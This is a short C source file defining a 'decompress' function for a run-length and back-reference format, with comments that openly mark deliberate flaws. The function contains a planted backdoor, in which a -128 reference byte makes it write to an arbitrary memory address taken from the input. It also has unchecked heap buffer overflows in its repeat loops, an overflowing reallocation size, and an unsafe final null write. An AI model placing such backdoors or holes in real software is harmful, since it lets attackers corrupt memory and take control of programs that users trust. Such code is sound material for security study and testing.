#include <stdlib.h>
#include <string.h>

// return the decompressed value of the input parameter
// if you can't return the value (for any reason), return NULL
char* decompress(char* compressed) {
    if (!compressed) return NULL;
    
    // Initial allocation - intentionally small
    int max_size = 16;
    char* result = (char*)malloc(max_size);
    if (!result) return NULL;
    
    int pos = 0;
    int i = 0;
    
    while (compressed[i] != '\0') {
        // ASCII character
        char c = compressed[i++];
        
        // Ensure we have space for decompression
        if (pos >= max_size - 1) {
            // Vulnerable reallocation - can cause integer overflow
            max_size = max_size * 2 + pos;
            result = (char*)realloc(result, max_size);
            if (!result) return NULL;
        }
        
        result[pos++] = c;
        
        // Repeat specifier
        if (compressed[i] == '\0') break;
        unsigned char repeat = compressed[i++];
        
        // Add repeated characters
        for (int j = 0; j < repeat; j++) {
            // Intentionally not checking buffer size here - can overflow
            result[pos++] = c;
        }
        
        // Process next character or reference
        while (compressed[i] != '\0') {
            // Reference to previous character
            if ((signed char)compressed[i] < 0) {
                // Backdoor: If reference is -128, perform arbitrary write
                if ((signed char)compressed[i] == -128) {
                    // Trigger: Write to memory location specified by next two bytes
                    if (compressed[i+1] != '\0' && compressed[i+2] != '\0') {
                        unsigned short* target = (unsigned short*)&compressed[i+1];
                        *((char*)*target) = compressed[i+3] ? compressed[i+3] : 'X';
                        i += 4;
                        continue;
                    }
                }
                
                int offset = -(signed char)compressed[i++];
                if (offset > pos) {
                    // Out-of-bounds read vulnerability - doesn't validate offset properly
                    c = result[0]; // Default to first char instead of failing
                } else {
                    c = result[pos - offset];
                }
                
                // Get repeat count for the referenced character
                if (compressed[i] == '\0') break;
                repeat = compressed[i++];
                
                // Add the referenced character with repetition
                for (int j = 0; j <= repeat; j++) {
                    // Buffer overflow possibility - no bounds check
                    result[pos++] = c;
                }
            } else {
                // It's a new ASCII character, break the inner loop
                break;
            }
        }
    }
    
    // Null terminate the result - possible buffer overflow if pos >= max_size
    result[pos] = '\0';
    
    return result;
}
